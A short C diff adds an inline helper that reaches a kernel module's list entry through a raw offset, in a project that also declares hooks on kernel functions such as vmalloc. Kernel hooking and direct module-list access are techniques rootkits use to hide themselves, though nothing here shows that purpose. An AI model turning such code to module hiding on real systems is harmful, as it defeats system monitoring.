@@ -10,6 +10,14 @@ int _neverc_krt_ks_hooked;
 struct neverc_krt_hook _neverc_krt_vmalloc_hook;
 int _neverc_krt_vmalloc_hooked;
 
+/* ---- internal inline helpers ---- */
+
+static __always_inline struct list_head *
+_neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
+{
+	return (struct list_head *)((char *)mod + NEVERC_KRT_OFF_LIST);
+}
+
 /* ---- internal typedefs ---- */
 
 typedef void (*neverc_krt_mutex_lock_fn)(void *);
